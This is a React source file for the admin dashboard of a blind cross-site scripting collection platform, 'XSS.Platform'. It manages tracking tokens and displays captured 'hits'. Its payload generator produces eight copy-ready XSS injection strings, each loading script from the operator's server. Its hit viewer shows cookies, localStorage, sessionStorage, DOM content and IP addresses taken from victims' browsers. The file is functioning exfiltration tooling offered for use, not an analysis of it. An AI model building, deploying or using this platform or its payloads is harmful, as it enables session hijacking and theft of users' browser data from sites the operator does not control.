import { useState, useMemo } from "react";
import { Link, useLocation } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { trpc } from "@/lib/trpc";
import { useAdmin } from "@/hooks/useAdmin";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import {
  Plus, Trash2, Copy, Eye, EyeOff, LogOut, Wrench, FlaskConical,
  Bell, RefreshCw, ChevronDown, ChevronUp, Globe, Monitor, Cookie,
  Database, Clock, Wifi, ArrowUpDown, SortAsc, SortDesc, Key, Lock,
  CheckCircle, AlertCircle, Shield, Terminal
} from "lucide-react";

function copyToClipboard(text: string, label = "已复制") {
  navigator.clipboard.writeText(text).then(() => toast.success(label));
}

function formatTime(date: Date | string) {
  return new Date(date).toLocaleString("zh-CN", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });
}

function HitCard({ hit, onDelete, onToggleRead }: {
  hit: any;
  onDelete: (id: number) => void;
  onToggleRead: (id: number, isRead: boolean) => void;
}) {
  const [expanded, setExpanded] = useState(false);

  return (
    <motion.div
      layout
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -8 }}
      className={`rounded-xl border transition-all duration-200 ${
        hit.isRead
          ? "bg-card border-border"
          : "bg-primary/[0.04] border-primary/25 shadow-sm shadow-primary/5"
      }`}
    >
      <div className="p-5">
        <div className="flex items-start justify-between gap-3">
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap mb-2.5">
              {!hit.isRead && (
                <span className="w-2 h-2 rounded-full bg-primary shrink-0 animate-pulse" />
              )}
              <Badge variant="outline" className="text-xs font-mono border-primary/30 text-primary bg-primary/5">
                {hit.token}
              </Badge>
              <span className="text-xs text-muted-foreground flex items-center gap-1">
                <Clock className="w-3 h-3" />
                {formatTime(hit.createdAt)}
              </span>
              {hit.inIframe && (
                <Badge variant="secondary" className="text-xs">iframe</Badge>
              )}
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-1.5 text-sm">
              {hit.pageUrl && (
                <div className="flex items-center gap-2 min-w-0 bg-foreground/[0.03] rounded-lg px-2.5 py-1.5">
                  <Globe className="w-3.5 h-3.5 text-primary/60 shrink-0" />
                  <span className="text-foreground/75 truncate text-xs font-mono">{hit.pageUrl}</span>
                </div>
              )}
              {hit.ip && (
                <div className="flex items-center gap-2 bg-foreground/[0.03] rounded-lg px-2.5 py-1.5">
                  <Wifi className="w-3.5 h-3.5 text-primary/60 shrink-0" />
                  <span className="text-foreground/75 text-xs font-mono">{hit.ip}</span>
                </div>
              )}
            </div>
          </div>

          <div className="flex items-center gap-0.5 shrink-0">
            <Button
              variant="ghost" size="sm"
              onClick={() => onToggleRead(hit.id, !hit.isRead)}
              className="h-8 w-8 p-0 text-muted-foreground hover:text-primary"
              title={hit.isRead ? "标为未读" : "标为已读"}
            >
              {hit.isRead ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
            </Button>
            <Button
              variant="ghost" size="sm"
              onClick={() => setExpanded(!expanded)}
              className="h-8 w-8 p-0 text-muted-foreground hover:text-foreground"
            >
              {expanded ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
            </Button>
            <Button
              variant="ghost" size="sm"
              onClick={() => onDelete(hit.id)}
              className="h-8 w-8 p-0 text-muted-foreground hover:text-destructive"
            >
              <Trash2 className="w-3.5 h-3.5" />
            </Button>
          </div>
        </div>
      </div>

      <AnimatePresence>
        {expanded && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: "auto", opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="overflow-hidden"
          >
            <div className="px-5 pb-5 pt-0 border-t border-border space-y-3 mt-0">
              <div className="pt-4" />
              {[
                { icon: <Monitor className="w-3.5 h-3.5" />, label: "User-Agent", value: hit.userAgent },
                { icon: <Globe className="w-3.5 h-3.5" />, label: "Referer", value: hit.referer },
                { icon: <Cookie className="w-3.5 h-3.5" />, label: "Cookies", value: hit.cookies },
                { icon: <Database className="w-3.5 h-3.5" />, label: "localStorage", value: hit.localStorage },
                { icon: <Database className="w-3.5 h-3.5" />, label: "sessionStorage", value: hit.sessionStorage },
              ].filter(f => f.value).map((field) => (
                <div key={field.label}>
                  <div className="flex items-center gap-1.5 text-xs text-muted-foreground mb-1.5">
                    <span className="text-primary/60">{field.icon}</span>
                    <span className="font-medium">{field.label}</span>
                    <button
                      onClick={() => copyToClipboard(field.value, `${field.label} 已复制`)}
                      className="ml-auto text-primary/60 hover:text-primary transition-colors"
                    >
                      <Copy className="w-3 h-3" />
                    </button>
                  </div>
                  <div className="bg-foreground/[0.04] rounded-lg p-2.5 font-mono text-xs text-foreground/75 break-all max-h-32 overflow-y-auto border border-border/50">
                    {field.value}
                  </div>
                </div>
              ))}

              {hit.dom && (
                <div>
                  <div className="flex items-center gap-1.5 text-xs text-muted-foreground mb-1.5">
                    <span className="text-primary/60"><Monitor className="w-3.5 h-3.5" /></span>
                    <span className="font-medium">DOM 内容（前 2000 字符）</span>
                    <button
                      onClick={() => copyToClipboard(hit.dom, "DOM 已复制")}
                      className="ml-auto text-primary/60 hover:text-primary transition-colors"
                    >
                      <Copy className="w-3 h-3" />
                    </button>
                  </div>
                  <div className="bg-foreground/[0.04] rounded-lg p-2.5 font-mono text-xs text-foreground/75 break-all max-h-48 overflow-y-auto border border-border/50">
                    {hit.dom.substring(0, 2000)}{hit.dom.length > 2000 ? "\n...(内容已截断)" : ""}
                  </div>
                </div>
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}

function PayloadGenerator({ token, serverUrl }: { token: string; serverUrl: string }) {
  const endpoint = `${serverUrl}/x/${token}`;
  const host = new URL(serverUrl).host;
  const payloads = [
    { label: "script src", code: `<script src="${endpoint}"></script>` },
    { label: "script (协议无关)", code: `<script src="//${host}/x/${token}"></script>` },
    { label: "img onerror", code: `<img src=x onerror="var s=document.createElement('script');s.src='${endpoint}';document.head.appendChild(s)">` },
    { label: "img onerror (短)", code: `<img src=x onerror=import('${endpoint}')>` },
    { label: "svg onload", code: `<svg onload="var s=document.createElement('script');s.src='${endpoint}';document.head.appendChild(s)">` },
    { label: "iframe", code: `<iframe src="javascript:var s=document.createElement('script');s.src='${endpoint}';document.head.appendChild(s)">` },
    { label: "body onload", code: `<body onload="var s=document.createElement('script');s.src='${endpoint}';document.head.appendChild(s)">` },
    { label: "input autofocus", code: `<input onfocus="var s=document.createElement('script');s.src='${endpoint}';document.head.appendChild(s)" autofocus>` },
  ];

  return (
    <div className="space-y-1.5">
      {payloads.map((p) => (
        <div key={p.label} className="flex items-center gap-2 bg-foreground/[0.04] rounded-lg px-3 py-2.5 border border-border/60 group hover:border-primary/20 transition-colors">
          <span className="text-xs text-primary font-medium w-32 shrink-0">{p.label}</span>
          <code className="text-xs font-mono text-foreground/60 flex-1 truncate">{p.code}</code>
          <Button
            variant="ghost" size="sm"
            className="h-7 w-7 p-0 shrink-0 text-muted-foreground hover:text-primary opacity-0 group-hover:opacity-100 transition-opacity"
            onClick={() => copyToClipboard(p.code, "Payload 已复制")}
          >
            <Copy className="w-3.5 h-3.5" />
          </Button>
        </div>
      ))}
    </div>
  );
}

// ── Change Password Modal ─────────────────────────────────────────────────────
function ChangePasswordModal({ onClose }: { onClose: () => void }) {
  const [oldPwd, setOldPwd] = useState("");
  const [newPwd, setNewPwd] = useState("");
  const [confirmPwd, setConfirmPwd] = useState("");
  const [done, setDone] = useState(false);

  const changePwd = trpc.admin.changePassword.useMutation({
    onSuccess: () => { setDone(true); toast.success("密码修改成功"); setTimeout(onClose, 1500); },
    onError: (e) => toast.error(e.message),
  });

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/20 backdrop-blur-sm" onClick={onClose}>
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 10 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.95, y: 10 }}
        transition={{ duration: 0.2 }}
        className="bg-card border border-border rounded-2xl p-6 w-full max-w-sm mx-4 shadow-2xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center gap-2 mb-5">
          <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
            <Key className="w-4 h-4 text-primary" />
          </div>
          <h2 className="font-serif text-xl font-bold text-foreground">修改密码</h2>
        </div>

        {done ? (
          <div className="text-center py-4">
            <CheckCircle className="w-10 h-10 text-primary mx-auto mb-2" />
            <p className="text-sm text-muted-foreground">密码修改成功</p>
          </div>
        ) : (
          <form onSubmit={(e) => {
            e.preventDefault();
            if (newPwd !== confirmPwd) { toast.error("两次密码不一致"); return; }
            if (newPwd.length < 8) { toast.error("新密码至少 8 位"); return; }
            changePwd.mutate({ oldPassword: oldPwd, newPassword: newPwd });
          }} className="space-y-4">
            {[
              { label: "当前密码", value: oldPwd, setter: setOldPwd, placeholder: "••••••••" },
              { label: "新密码（至少 8 位）", value: newPwd, setter: setNewPwd, placeholder: "••••••••" },
              { label: "确认新密码", value: confirmPwd, setter: setConfirmPwd, placeholder: "••••••••" },
            ].map(({ label, value, setter, placeholder }) => (
              <div key={label} className="space-y-1.5">
                <label className="text-xs font-medium text-muted-foreground">{label}</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
                  <Input
                    type="password"
                    value={value}
                    onChange={(e) => setter(e.target.value)}
                    className="pl-9 h-9 text-sm"
                    placeholder={placeholder}
                  />
                </div>
              </div>
            ))}

            {changePwd.error && (
              <div className="flex items-center gap-2 text-xs text-destructive bg-destructive/8 rounded-lg px-3 py-2 border border-destructive/20">
                <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                {changePwd.error.message}
              </div>
            )}

            <div className="flex gap-2 pt-1">
              <Button type="button" variant="outline" size="sm" className="flex-1" onClick={onClose}>取消</Button>
              <Button
                type="submit" size="sm"
                className="flex-1 bg-primary text-primary-foreground hover:bg-primary/90"
                disabled={changePwd.isPending}
              >
                {changePwd.isPending ? "修改中..." : "确认修改"}
              </Button>
            </div>
          </form>
        )}
      </motion.div>
    </div>
  );
}

// ── Main Dashboard ────────────────────────────────────────────────────────────
export default function Dashboard() {
  const { isAdmin, isLoading: authLoading } = useAdmin(true);
  const [newLabel, setNewLabel] = useState("");
  const [selectedToken, setSelectedToken] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<"hits" | "tokens" | "settings">("hits");
  const [sortOrder, setSortOrder] = useState<"desc" | "asc">("desc");
  const [showChangePwd, setShowChangePwd] = useState(false);
  const [, navigate] = useLocation();

  const serverUrl = window.location.origin;
  const utils = trpc.useUtils();

  const { data: tokens = [], isLoading: tokensLoading } = trpc.tokens.list.useQuery(undefined, { enabled: isAdmin });
  const { data: hits = [], isLoading: hitsLoading, refetch: refetchHits } = trpc.hits.list.useQuery(undefined, { enabled: isAdmin });
  const { data: unreadData } = trpc.hits.unreadCount.useQuery(undefined, { enabled: isAdmin, refetchInterval: 30000 });

  const createToken = trpc.tokens.create.useMutation({
    onSuccess: () => { utils.tokens.list.invalidate(); setNewLabel(""); toast.success("Token 创建成功"); },
    onError: (e) => toast.error(e.message),
  });

  const deleteToken = trpc.tokens.delete.useMutation({
    onSuccess: () => { utils.tokens.list.invalidate(); toast.success("Token 已删除"); },
    onError: (e) => toast.error(e.message),
  });

  const markRead = trpc.hits.markRead.useMutation({
    onSuccess: () => { utils.hits.list.invalidate(); utils.hits.unreadCount.invalidate(); },
    onError: (e) => toast.error("操作失败：" + e.message),
  });

  const markAllRead = trpc.hits.markAllRead.useMutation({
    onSuccess: () => {
      utils.hits.list.invalidate();
      utils.hits.unreadCount.invalidate();
      toast.success("全部已标为已读");
    },
    onError: (e) => toast.error("操作失败：" + e.message),
  });

  const deleteHit = trpc.hits.delete.useMutation({
    onSuccess: () => { utils.hits.list.invalidate(); utils.hits.unreadCount.invalidate(); toast.success("记录已删除"); },
    onError: (e) => toast.error("删除失败：" + e.message),
  });

  const logoutMutation = trpc.admin.logout.useMutation({
    onSuccess: () => { navigate("/login"); toast.success("已退出登录"); },
  });

  // Sorted & filtered hits
  const filteredHits = useMemo(() => {
    let list = selectedToken ? hits.filter((h: any) => h.token === selectedToken) : [...hits];
    list.sort((a: any, b: any) => {
      const ta = new Date(a.createdAt).getTime();
      const tb = new Date(b.createdAt).getTime();
      return sortOrder === "desc" ? tb - ta : ta - tb;
    });
    return list;
  }, [hits, selectedToken, sortOrder]);

  if (authLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex items-center gap-3 text-muted-foreground text-sm">
          <span className="w-4 h-4 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
          验证身份中...
        </div>
      </div>
    );
  }

  const tabs = [
    { label: "命中记录", id: "hits" as const, badge: unreadData?.count },
    { label: "Token 管理", id: "tokens" as const },
    { label: "设置", id: "settings" as const },
  ];

  return (
    <div className="min-h-screen bg-background">
      {/* ── Top nav ─────────────────────────────────────────────── */}
      <nav className="sticky top-0 z-40 bg-background/95 backdrop-blur-md border-b border-border/70">
        <div className="container flex items-center justify-between h-14">
          <div className="flex items-center gap-5">
            <Link href="/" className="font-serif text-lg font-bold text-foreground">
              XSS<span className="text-primary">.</span>Platform
            </Link>
            <div className="hidden md:flex items-center gap-0.5">
              {tabs.map((item) => (
                <button
                  key={item.id}
                  onClick={() => setActiveTab(item.id)}
                  className={`relative px-3 py-1.5 text-sm rounded-md transition-colors flex items-center gap-1.5 ${
                    activeTab === item.id
                      ? "bg-primary/10 text-primary font-medium"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {item.label}
                  {item.badge && item.badge > 0 && (
                    <span className="w-4 h-4 rounded-full bg-primary text-primary-foreground text-[10px] flex items-center justify-center font-bold">
                      {item.badge > 9 ? "9+" : item.badge}
                    </span>
                  )}
                </button>
              ))}
            </div>
          </div>

          <div className="flex items-center gap-1.5">
            {(unreadData?.count ?? 0) > 0 && (
              <div className="hidden sm:flex items-center gap-1.5 text-xs text-primary bg-primary/10 rounded-full px-2.5 py-1 border border-primary/20">
                <Bell className="w-3 h-3" />
                {unreadData?.count} 条未读
              </div>
            )}
            <Link href="/tools">
              <Button variant="ghost" size="sm" className="h-8 gap-1.5 text-muted-foreground hover:text-foreground">
                <Wrench className="w-3.5 h-3.5" />
                <span className="hidden sm:inline text-xs">工具包</span>
              </Button>
            </Link>
            <Link href="/labs">
              <Button variant="ghost" size="sm" className="h-8 gap-1.5 text-muted-foreground hover:text-foreground">
                <FlaskConical className="w-3.5 h-3.5" />
                <span className="hidden sm:inline text-xs">Labs</span>
              </Button>
            </Link>
            <Button
              variant="ghost" size="sm"
              className="h-8 gap-1.5 text-muted-foreground hover:text-destructive"
              onClick={() => logoutMutation.mutate()}
            >
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden sm:inline text-xs">退出</span>
            </Button>
          </div>
        </div>
      </nav>

      {/* Mobile tab switcher */}
      <div className="md:hidden border-b border-border bg-background">
        <div className="container flex gap-0.5 py-2">
          {tabs.map((item) => (
            <button
              key={item.id}
              onClick={() => setActiveTab(item.id)}
              className={`flex-1 py-2 text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 ${
                activeTab === item.id ? "bg-primary/10 text-primary font-medium" : "text-muted-foreground"
              }`}
            >
              {item.label}
              {item.badge && item.badge > 0 && (
                <span className="w-4 h-4 rounded-full bg-primary text-primary-foreground text-[10px] flex items-center justify-center font-bold">
                  {item.badge > 9 ? "9+" : item.badge}
                </span>
              )}
            </button>
          ))}
        </div>
      </div>

      <div className="container py-8">

        {/* ── Hits Tab ─────────────────────────────────────────── */}
        {activeTab === "hits" && (
          <div>
            <div className="flex items-center justify-between mb-6 gap-4">
              <div>
                <h1 className="font-serif text-2xl font-bold text-foreground">命中记录</h1>
                <p className="text-sm text-muted-foreground mt-0.5">
                  共 <span className="text-foreground font-medium">{hits.length}</span> 条记录，
                  <span className="text-primary font-medium">{unreadData?.count ?? 0}</span> 条未读
                </p>
              </div>
              <div className="flex items-center gap-2 flex-wrap justify-end">
                {/* Sort control */}
                <button
                  onClick={() => setSortOrder(sortOrder === "desc" ? "asc" : "desc")}
                  className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground border border-border rounded-lg px-2.5 py-1.5 transition-colors bg-background"
                >
                  {sortOrder === "desc" ? <SortDesc className="w-3.5 h-3.5" /> : <SortAsc className="w-3.5 h-3.5" />}
                  {sortOrder === "desc" ? "最新优先" : "最早优先"}
                </button>
                {/* Token filter */}
                <select
                  value={selectedToken || ""}
                  onChange={(e) => setSelectedToken(e.target.value || null)}
                  className="text-xs border border-border rounded-lg px-2.5 py-1.5 bg-background text-foreground cursor-pointer"
                >
                  <option value="">全部 Token</option>
                  {tokens.map((t: any) => (
                    <option key={t.token} value={t.token}>{t.label || t.token}</option>
                  ))}
                </select>
                {(unreadData?.count ?? 0) > 0 && (
                  <Button
                    variant="outline" size="sm"
                    onClick={() => markAllRead.mutate()}
                    disabled={markAllRead.isPending}
                    className="h-8 text-xs gap-1.5"
                    title="全部标记已读"
                  >
                    <Eye className="w-3.5 h-3.5" />
                    <span className="hidden sm:inline">全部已读</span>
                  </Button>
                )}
                <Button
                  variant="outline" size="sm"
                  onClick={() => refetchHits()}
                  className="h-8 w-8 p-0"
                  title="手动刷新"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                </Button>
              </div>
            </div>

            {hitsLoading ? (
              <div className="flex items-center justify-center py-16 gap-3 text-muted-foreground text-sm">
                <span className="w-4 h-4 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
                加载中...
              </div>
            ) : filteredHits.length === 0 ? (
              <div className="text-center py-20 border border-dashed border-border/60 rounded-2xl">
                <div className="w-14 h-14 rounded-2xl bg-foreground/5 flex items-center justify-center mx-auto mb-4">
                  <Terminal className="w-7 h-7 text-muted-foreground/40" />
                </div>
                <p className="text-muted-foreground text-sm font-medium">暂无命中记录</p>
                <p className="text-xs text-muted-foreground/60 mt-1.5">
                  创建 Token 并注入 Payload 后，触发记录将显示在这里
                </p>
              </div>
            ) : (
              <AnimatePresence mode="popLayout">
                <div className="space-y-3">
                  {filteredHits.map((hit: any) => (
                    <HitCard
                      key={hit.id}
                      hit={hit}
                      onDelete={(id) => deleteHit.mutate({ id })}
                      onToggleRead={(id, isRead) => markRead.mutate({ id, isRead })}
                    />
                  ))}
                </div>
              </AnimatePresence>
            )}
          </div>
        )}

        {/* ── Tokens Tab ───────────────────────────────────────── */}
        {activeTab === "tokens" && (
          <div>
            <div className="flex items-center justify-between mb-6">
              <div>
                <h1 className="font-serif text-2xl font-bold text-foreground">Token 管理</h1>
                <p className="text-sm text-muted-foreground mt-0.5">管理你的 XSS 接收端点</p>
              </div>
            </div>

            {/* Create token */}
            <div className="bg-card border border-border rounded-xl p-5 mb-6">
              <h3 className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
                <Plus className="w-4 h-4 text-primary" />
                创建新 Token
              </h3>
              <div className="flex gap-2">
                <Input
                  placeholder="标签（可选，如：测试项目A）"
                  value={newLabel}
                  onChange={(e) => setNewLabel(e.target.value)}
                  className="flex-1 h-9 text-sm"
                  onKeyDown={(e) => e.key === "Enter" && createToken.mutate({ label: newLabel })}
                />
                <Button
                  onClick={() => createToken.mutate({ label: newLabel })}
                  disabled={createToken.isPending}
                  className="bg-primary text-primary-foreground hover:bg-primary/90 gap-1.5 h-9"
                >
                  <Plus className="w-4 h-4" />
                  创建
                </Button>
              </div>
            </div>

            {tokensLoading ? (
              <div className="flex items-center justify-center py-16 gap-3 text-muted-foreground text-sm">
                <span className="w-4 h-4 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
                加载中...
              </div>
            ) : tokens.length === 0 ? (
              <div className="text-center py-20 border border-dashed border-border/60 rounded-2xl">
                <p className="text-muted-foreground text-sm">暂无 Token，点击上方创建</p>
              </div>
            ) : (
              <div className="space-y-4">
                {tokens.map((token: any) => (
                  <div key={token.id} className="bg-card border border-border rounded-xl p-5 hover:border-primary/20 transition-colors">
                    <div className="flex items-start justify-between gap-3 mb-4">
                      <div>
                        <div className="flex items-center gap-2 mb-1">
                          <code className="font-mono text-sm font-bold text-primary">{token.token}</code>
                          {token.label && (
                            <Badge variant="secondary" className="text-xs">{token.label}</Badge>
                          )}
                        </div>
                        <p className="text-xs text-muted-foreground">
                          创建于 {formatTime(token.createdAt)}
                        </p>
                      </div>
                      <div className="flex items-center gap-1">
                        <Button
                          variant="ghost" size="sm"
                          className="h-8 w-8 p-0 text-muted-foreground hover:text-primary"
                          onClick={() => copyToClipboard(`${serverUrl}/x/${token.token}`, "端点 URL 已复制")}
                          title="复制端点 URL"
                        >
                          <Copy className="w-3.5 h-3.5" />
                        </Button>
                        <Button
                          variant="ghost" size="sm"
                          className="h-8 w-8 p-0 text-muted-foreground hover:text-destructive"
                          onClick={() => {
                            if (confirm("确定删除该 Token 及其所有命中记录？")) {
                              deleteToken.mutate({ id: token.id });
                            }
                          }}
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </Button>
                      </div>
                    </div>

                    {/* Endpoint URL */}
                    <div className="bg-foreground/[0.04] rounded-lg px-3 py-2.5 font-mono text-xs text-foreground/65 mb-4 flex items-center justify-between gap-2 border border-border/50">
                      <span className="truncate">{serverUrl}/x/{token.token}</span>
                      <button
                        onClick={() => copyToClipboard(`${serverUrl}/x/${token.token}`, "已复制")}
                        className="text-primary/60 hover:text-primary transition-colors shrink-0"
                      >
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>

                    {/* Payload generator */}
                    <div>
                      <p className="text-xs font-medium text-muted-foreground mb-2 flex items-center gap-1.5">
                        <Terminal className="w-3.5 h-3.5 text-primary/60" />
                        可用 Payload（悬停显示复制按钮）
                      </p>
                      <PayloadGenerator token={token.token} serverUrl={serverUrl} />
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* ── Settings Tab ─────────────────────────────────────── */}
        {activeTab === "settings" && (
          <div className="max-w-lg">
            <div className="mb-6">
              <h1 className="font-serif text-2xl font-bold text-foreground">设置</h1>
              <p className="text-sm text-muted-foreground mt-0.5">管理账号与平台配置</p>
            </div>

            <div className="space-y-4">
              {/* Change password */}
              <div className="bg-card border border-border rounded-xl p-5">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-9 h-9 rounded-xl bg-primary/10 flex items-center justify-center">
                      <Key className="w-4 h-4 text-primary" />
                    </div>
                    <div>
                      <p className="text-sm font-medium text-foreground">修改密码</p>
                      <p className="text-xs text-muted-foreground">更改管理员登录密码</p>
                    </div>
                  </div>
                  <Button
                    variant="outline" size="sm"
                    onClick={() => setShowChangePwd(true)}
                    className="text-xs"
                  >
                    修改
                  </Button>
                </div>
              </div>

              {/* Security info */}
              <div className="bg-card border border-border rounded-xl p-5">
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-9 h-9 rounded-xl bg-primary/10 flex items-center justify-center">
                    <Shield className="w-4 h-4 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-foreground">安全信息</p>
                    <p className="text-xs text-muted-foreground">当前平台安全配置</p>
                  </div>
                </div>
                <div className="space-y-2">
                  {[
                    { label: "密码加密", value: "bcrypt (cost=12)" },
                    { label: "Session 方式", value: "JWT HS256 · 7天有效" },
                    { label: "防暴力破解", value: "5次失败锁定 IP 15分钟" },
                    { label: "Probe 上报", value: "POST JSON + GET fallback" },
                  ].map(({ label, value }) => (
                    <div key={label} className="flex items-center justify-between text-xs py-1.5 border-b border-border/50 last:border-0">
                      <span className="text-muted-foreground">{label}</span>
                      <span className="font-mono text-foreground/70">{value}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Platform info */}
              <div className="bg-card border border-border rounded-xl p-5">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-9 h-9 rounded-xl bg-primary/10 flex items-center justify-center">
                    <Terminal className="w-4 h-4 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-foreground">平台信息</p>
                    <p className="text-xs text-muted-foreground">当前接收端点配置</p>
                  </div>
                </div>
                <div className="bg-foreground/[0.04] rounded-lg px-3 py-2 font-mono text-xs text-foreground/65 border border-border/50">
                  Server URL: {serverUrl}
                </div>
                <p className="text-xs text-muted-foreground mt-2">
                  部署后请通过环境变量 <code className="font-mono bg-foreground/5 px-1 rounded">SERVER_URL</code> 设置正确的域名
                </p>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Change Password Modal */}
      <AnimatePresence>
        {showChangePwd && <ChangePasswordModal onClose={() => setShowChangePwd(false)} />}
      </AnimatePresence>
    </div>
  );
}
